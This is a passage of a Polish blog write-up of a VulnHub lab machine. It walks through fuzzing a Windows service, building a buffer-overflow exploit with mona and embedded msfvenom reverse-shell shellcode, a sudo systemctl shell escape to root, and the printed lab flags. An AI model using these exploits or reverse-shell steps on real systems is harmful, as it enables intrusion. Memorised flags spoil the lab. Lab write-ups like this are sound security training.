ip <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;192.168.2.130&#34;</span>

port <span style="color:#f92672">=</span> <span style="color:#ae81ff">2371</span>
timeout <span style="color:#f92672">=</span> <span style="color:#ae81ff">5</span>
prefix <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>

string <span style="color:#f92672">=</span> prefix <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">100</span>

<span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
  <span style="color:#66d9ef">try</span>:
    <span style="color:#66d9ef">with</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM) <span style="color:#66d9ef">as</span> s:
      s<span style="color:#f92672">.</span>settimeout(timeout)
      s<span style="color:#f92672">.</span>connect((ip, port))
      s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
      print(<span style="color:#e6db74">&#34;Fuzzing with </span><span style="color:#e6db74">{}</span><span style="color:#e6db74"> bytes&#34;</span><span style="color:#f92672">.</span>format(len(string) <span style="color:#f92672">-</span> len(prefix)))
      s<span style="color:#f92672">.</span>send(bytes(string, <span style="color:#e6db74">&#34;latin-1&#34;</span>))
      s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
  <span style="color:#66d9ef">except</span>:
    print(<span style="color:#e6db74">&#34;Fuzzing crashed at </span><span style="color:#e6db74">{}</span><span style="color:#e6db74"> bytes&#34;</span><span style="color:#f92672">.</span>format(len(string) <span style="color:#f92672">-</span> len(prefix)))
    sys<span style="color:#f92672">.</span>exit(<span style="color:#ae81ff">0</span>)
  string <span style="color:#f92672">+=</span> <span style="color:#ae81ff">100</span> <span style="color:#f92672">*</span> <span style="color:#e6db74">&#34;A&#34;</span>
  time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">1</span>)
</code></pre></div><p>Jak widaƒá nasz skrypt ma ustawione IP oraz port na Windowsa z naszym pliczkiem .exe. Dzia≈Çanie jest proste, poniewa≈º skrypt pr√≥buje wej≈õƒá na ten okre≈õlony port i wysy≈Ça okre≈õlonƒÖ liczbƒô bajt√≥w ciƒÖgu znak√≥w <code>A</code> a≈º program siƒô scrashuje. Je≈ºeli program siƒô wy≈ÇƒÖczy, skrypt podaje po ilu set takich <code>A</code> nastƒÖpi≈Ç ten crash.</p>
<p>Dzia≈Çanie skryptu:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">‚îå<span style="color:#f92672">[</span>parrot@parrot<span style="color:#f92672">]</span>‚îÄ<span style="color:#f92672">[</span>~/vulnhub/netstart/buff<span style="color:#f92672">]</span>
‚îî‚ïº<span style="color:#f92672">[</span>‚òÖ <span style="color:#f92672">]</span>$python3 fuzzer.py                                              
Fuzzing with <span style="color:#ae81ff">100</span> bytes
Fuzzing with <span style="color:#ae81ff">200</span> bytes
Fuzzing with <span style="color:#ae81ff">300</span> bytes
Fuzzing with <span style="color:#ae81ff">400</span> bytes
Fuzzing with <span style="color:#ae81ff">500</span> bytes
Fuzzing with <span style="color:#ae81ff">600</span> bytes
Fuzzing with <span style="color:#ae81ff">700</span> bytes
Fuzzing with <span style="color:#ae81ff">800</span> bytes
Fuzzing with <span style="color:#ae81ff">900</span> bytes
Fuzzing with <span style="color:#ae81ff">1000</span> bytes
Fuzzing with <span style="color:#ae81ff">1100</span> bytes
Fuzzing with <span style="color:#ae81ff">1200</span> bytes
Fuzzing with <span style="color:#ae81ff">1300</span> bytes
Fuzzing with <span style="color:#ae81ff">1400</span> bytes
Fuzzing with <span style="color:#ae81ff">1500</span> bytes
Fuzzing with <span style="color:#ae81ff">1600</span> bytes
Fuzzing with <span style="color:#ae81ff">1700</span> bytes
Fuzzing crashed at <span style="color:#ae81ff">1700</span> bytes
</code></pre></div><p>Jak widaƒá juz po 1700 bajtach scrashowa≈Ço program. Widaƒá to r√≥wnie≈º w Windowsie w <code>Immunity Debuggerze</code>.</p>
<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220830231632.png" alt=""  />
</p>
<p>Teraz kiedy ju≈º znamy tƒÖ liczbƒô, mo≈ºemy stworzyƒá specjalny pattern, przez co ustalimy dalsze kroki dzia≈Çania. U≈ºyjƒô do tego narzƒôdzia z pakietu <code>Metasploit</code> a dok≈Çadnie <code>pattern_create.rb</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">‚îå<span style="color:#f92672">[</span>parrot@parrot<span style="color:#f92672">]</span>‚îÄ<span style="color:#f92672">[</span>~/vulnhub/netstart/buff<span style="color:#f92672">]</span>
‚îî‚ïº<span style="color:#f92672">[</span>‚òÖ <span style="color:#f92672">]</span>$/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <span style="color:#ae81ff">1800</span>

Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9
</code></pre></div><hr>
<h2 id="exploitpy">exploit.py<a hidden class="anchor" aria-hidden="true" href="#exploitpy">#</a></h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> socket
ip <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;192.168.2.130&#34;</span>
port <span style="color:#f92672">=</span> <span style="color:#ae81ff">2371</span>

prefix <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
overflow <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> offset
retn <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
padding <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
payload<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9&#34;</span>
postfix <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
buffer <span style="color:#f92672">=</span> prefix <span style="color:#f92672">+</span> overflow <span style="color:#f92672">+</span> retn <span style="color:#f92672">+</span> padding <span style="color:#f92672">+</span> payload <span style="color:#f92672">+</span> postfix

s <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)

<span style="color:#66d9ef">try</span>:
  s<span style="color:#f92672">.</span>connect((ip, port))
  print(<span style="color:#e6db74">&#34;Sending evil buffer...&#34;</span>)
  s<span style="color:#f92672">.</span>send(bytes(buffer <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;latin-1&#34;</span>))
  print(<span style="color:#e6db74">&#34;Done!&#34;</span>)
<span style="color:#66d9ef">except</span>:
  print(<span style="color:#e6db74">&#34;Could not connect.&#34;</span>)
</code></pre></div><p>Mamy podobny program do tego poprzedniego, jednak tutaj bƒôdzie dzia≈Ço siƒô wiele wiƒôcej. Z najwa≈ºniejszych rzeczy mamy <code>IP</code>, <code>port</code>, <code>offset</code>, <code>retn</code>, <code>padding</code>, <code>payload</code>. Ka≈ºdƒÖ z tych zmiennych bƒôdziemy modyfikowaƒá. Oczywi≈õcie poza IP oraz portem.</p>
<p>Dzia≈Çanie programu:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">‚îå<span style="color:#f92672">[</span>parrot@parrot<span style="color:#f92672">]</span>‚îÄ<span style="color:#f92672">[</span>~/vulnhub/netstart/buff<span style="color:#f92672">]</span>
‚îî‚ïº<span style="color:#f92672">[</span>‚òÖ <span style="color:#f92672">]</span>$python3 exploit.py       
Sending evil buffer...
Done!
</code></pre></div><p>Ca≈Ço≈õƒá zadzia≈Ça siƒô na Windowsie. Program scrashowa≈Ç, co jest dla nas dobrym znakiem. Teraz korzystamy z modu≈Çu <code>mona</code> w <code>Immunity Debugger</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">!mona findmsp -distance <span style="color:#ae81ff">1800</span>
</code></pre></div><p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220830232840.png" alt=""  />
</p>
<p>Dla nas najwa≈ºniejsze jest dostanie siƒô do <code>EIP</code>. Komenda powy≈ºej umo≈ºliwia nam odkrycie zmiennej <code>offset</code>. Jest to pierwsza potrzebna zmienna do kontynuacji eksploitacji. Zaznaczona linia na screenshocie zawiera ciƒÖg <code>offset 1702</code>.</p>
<p>Teraz gdy ju≈º mam tƒÖ danƒÖ, modyfikujƒô i ustawiam:</p>
<ul>
<li>offset = &ldquo;1702&rdquo;</li>
<li>payload = &quot;&quot;</li>
<li>retr = &ldquo;BBBB&rdquo;</li>
</ul>
<p>Dziƒôki ostatniej zmiennej <code>retr</code> sprawdzƒô, czy wszystko idzie zgodnie z planem, ale o tym zaraz.</p>
<p>Po uruchomieniu widzimy, ≈ºe EAX jest nadpisany samymi <code>A</code> a <code>EIP</code> zosta≈Ço wpisane tajemnicze <code>42424242</code>. Jak siƒô okazuje, jest to ciƒÖg znak√≥w <code>BBBB</code>, ale zapisany w systemie szesnastkowym. W ten spos√≥b sprawdzi≈Çem, czy to co wpiszƒô w <code>retr</code> faktycznie zostanie wpisane w rejestr <code>EIP</code>. Teraz mamy ju≈º po≈Çowƒô sukcesu.</p>
<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220830233801.png" alt=""  />
</p>
<p>Nastƒôpny krok to sprawdzenie tzw. <code>bad characters</code>. W tym celu pod zmiennƒÖ <code>payload</code> zapisujƒô taki ciƒÖg znak√≥w.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff
</code></pre></div><p>SƒÖ to zapisane szesnastkowo kolejne znaki od 0,1,2,&hellip;a,b,c,&hellip;,A,B,C,Z&hellip;</p>
<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220830234303.png" alt=""  />

Mniej wiƒôcej tak wyglƒÖdajƒÖ te znaki. Wiƒôkszo≈õƒá jest czytelna, ale to nie jest istotne.</p>
<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220830234431.png" alt=""  />
</p>
<p>Generowanie <code>.bin</code> do por√≥wnywania bez okre≈õlonych znak√≥w:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">!mona bytearray -b &#34;\x00&#34;
</code></pre></div><p>Po ka≈ºdym crashu kopiowa≈Çem adres <code>ESP</code>  i por√≥wnywa≈Çem wyniki.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">!mona compare -f &#34;C:\Program Files (x86)\Immunity Inc\Immunity Debugger\bytearray.bin&#34; -a 0107FB48
</code></pre></div><p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220830234919.png" alt=""  />
</p>
<p><code>BadChars = &quot;00 01 02 03 04 2d&quot;</code></p>
<p>W tym przypadku konsola pokazywa≈Ça dziwne wyniki, gdy usuwa≈Çem kolejne chary. Bardziej sugerowa≈Çem siƒô poprzez <code>Follow in Dump</code> rejestru <code>ESP</code>.</p>
<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220905131444.png" alt=""  />

Oczywi≈õcie wspomaga≈Çem siƒô te≈º por√≥wnywaniem w konsoli, za ka≈ºdym razem generujƒÖc za ka≈ºdym razem nowy plik .bin i usuwajƒÖc kolejne bad chary.</p>
<p><code>!mona compare -f &quot;C:\Program Files (x86)\Immunity Inc\Immunity Debugger\bytearray.bin&quot; -a 00FDFB48</code></p>
<p>Ostatecznie doszed≈Çem do momentu gdzie mia≈Çem 8 bad char√≥w ≈ÇƒÖcznie z <code>\x00</code>.</p>
<p><code>!mona bytearray -b &quot;\x00\x2d\x2e\x46\x47\x59\x5e\x60&quot;</code></p>
<p>Nastƒôpnie sprawdzi≈Çem adres <code>JMP</code>.</p>
<p><code>!mona jmp -r esp -cpb &quot;\x00\x2d\x2e\x46\x47\x59\x5e\x60&quot;</code></p>
<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220905014732.png" alt=""  />
</p>
<p>Adres to 0x625012B8, ale wpisuje w m√≥j plik <code>exploit.py</code> adres w odwr√≥cony spos√≥b.</p>
<p>Niestety mia≈Çem problemy z uzyskaniem reverse shella z mojego Windowsa, ale przygotowa≈Çem na gotowo payload na Linuxa i wszystko zadzia≈Ça≈Ço. Nie wiem gdzie by≈Ç problem.</p>
<p>Wygenerowa≈Çem shellcode <code>msfvenom</code> na adres IP mojego Linuxa, okre≈õlony port, oraz dok≈Çadnie te bad chary, kt√≥re znalaz≈Çem.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msfvenom -p linux/x86/shell_reverse_tcp LHOST<span style="color:#f92672">=</span>192.168.2.128 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">1237</span> EXITFUNC<span style="color:#f92672">=</span>thread -b <span style="color:#e6db74">&#34;\x00\x2d\x2e\x46\x47\x59\x5e\x60&#34;</span> -f c
</code></pre></div><p>Finalny <code>exploit.py</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> socket
ip <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;192.168.2.148&#34;</span>
port <span style="color:#f92672">=</span> <span style="color:#ae81ff">2371</span>

prefix <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">1702</span>
overflow <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> offset
retn <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xc5\x12\x50\x62</span><span style="color:#e6db74">&#34;</span>
padding <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">16</span>
payload<span style="color:#f92672">=</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x31\xc9\xb1\x11\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x93</span><span style="color:#e6db74">&#34;</span>
<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xba\xd5\xb3\x83\xeb\xfc\xe2\xf4\xa2\x61\x22\x50\xc0\xf9\x86</span><span style="color:#e6db74">&#34;</span>
<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xd9\x91\x33\x34\x03\xf5\x77\x55\x20\xca\x0a\xea\x7e\x13\xf3</span><span style="color:#e6db74">&#34;</span>
<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xac\x4a\xfb\x7a\x7d\xb1\x13\xd2\xd7\xb3\x97\x6f\x5c\x52\x23</span><span style="color:#e6db74">&#34;</span>
<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xdc\x85\xe2\xc0\x09\xd6\x3a\x72\x77\x55\xe1\xfb\xd4\xfa\xc0</span><span style="color:#e6db74">&#34;</span>
<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xfb\xd2\xfa\x9c\xf1\xd3\x5c\x50\xc1\xe9\x5c\x52\x23\xb1\x18</span><span style="color:#e6db74">&#34;</span>
<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x33</span><span style="color:#e6db74">&#34;</span>)
postfix <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
buffer <span style="color:#f92672">=</span> prefix <span style="color:#f92672">+</span> overflow <span style="color:#f92672">+</span> retn <span style="color:#f92672">+</span> padding <span style="color:#f92672">+</span> payload <span style="color:#f92672">+</span> postfix

s <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)

<span style="color:#66d9ef">try</span>:
  s<span style="color:#f92672">.</span>connect((ip, port))
  print(<span style="color:#e6db74">&#34;Sending evil buffer...&#34;</span>)
  s<span style="color:#f92672">.</span>send(bytes(buffer <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;latin-1&#34;</span>))
  print(<span style="color:#e6db74">&#34;Done!&#34;</span>)
<span style="color:#66d9ef">except</span>:
  print(<span style="color:#e6db74">&#34;Could not connect.&#34;</span>)

</code></pre></div><p>Widzimy zmiennƒÖ <code>offset</code>, <code>retn</code>, o kt√≥rej m√≥wi≈Çem wcze≈õniej z odwr√≥conym adresem. Doda≈Çem te≈º <code>padding</code>, aby wszystko zadzia≈Ça≈Ço poprawnie. Uzyska≈Çem po≈ÇƒÖczenie na danym porcie.</p>
<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220905132120.png" alt=""  />
</p>
<h2 id="localtxt">local.txt<a hidden class="anchor" aria-hidden="true" href="#localtxt">#</a></h2>
<p><code>75894c2b3d5c3b78372af63694cdc659</code></p>
<hr>
<h1 id="privileges-escalation">Privileges Escalation<a hidden class="anchor" aria-hidden="true" href="#privileges-escalation">#</a></h1>
<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220905175421.png" alt=""  />
</p>
<p>User <code>fox</code> ma dostƒôp do komendy <code>/usr/bin/systemctl</code> z uprawnieniami administratora, bez has≈Ça.</p>
<p>Zatem zgodnie z GTFOBins wystarczy</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo /usr/bin/systemctl
!sh
</code></pre></div><p>i mamy roota üòÅ</p>
<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220905175839.png" alt=""  />
</p>
<hr>
<h2 id="root-proof">Root proof<a hidden class="anchor" aria-hidden="true" href="#root-proof">#</a></h2>
<p><code>f632f5eaffa5607c961e22ba40291ab7</code></p>
<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220905175913.png" alt=""  />
</p>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
